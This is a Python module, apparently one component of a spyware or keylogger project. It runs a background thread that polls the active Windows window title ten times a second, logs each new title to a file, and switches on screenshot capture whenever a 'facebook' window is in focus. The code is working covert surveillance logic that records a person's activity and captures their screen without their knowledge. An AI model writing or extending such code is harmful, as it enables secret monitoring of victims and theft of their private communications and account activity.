import win32gui, time, win32process
from threading import Thread
from Screenshot import Screenshot



class WindowTracker(Thread):


    def __init__(self, screenshot:Screenshot, filehandler):
        Thread.__init__(self, name='window tracking')
        self.__activeWindow = None
        self.__samplingFrequency = 0.1
        self.__screenshot = screenshot
        self.__screenshotTrigger = ['facebook']
        self.__filehandler = filehandler
        self.__debug = True



    def run(self):
        while True:
            time.sleep(self.__samplingFrequency)
            activeWindow = win32gui.GetForegroundWindow()
            activeWindowText = win32gui.GetWindowText(activeWindow)
            self.checkWindow(activeWindowText)
            self.checkTrigger(activeWindowText)



    def checkWindow(self, activeWindowTitle:str) -> None:
        if self.__activeWindow != activeWindowTitle:
            self.__activeWindow = activeWindowTitle
            windowTitle = '\n'*2 + f'{self.__activeWindow}'.center(100,'-') + '\n'
            if self.__debug:
                print(windowTitle)
            else:
                self.__filehandler.writeToFile(windowTitle)



    def checkTrigger(self, activeWindowText:str):
        for trigger in self.__screenshotTrigger:
            if trigger in activeWindowText.lower():
                self.__screenshot.isActive = True
            else:
                self.__screenshot.isActive = False




if __name__ == "__main__":
    from FileHandler import FileHandler
    from os import system
    system('cls')
    fileHandler = FileHandler()
    screenshot = Screenshot()
    windowTracker = WindowTracker(screenshot, fileHandler)
    windowTracker.start()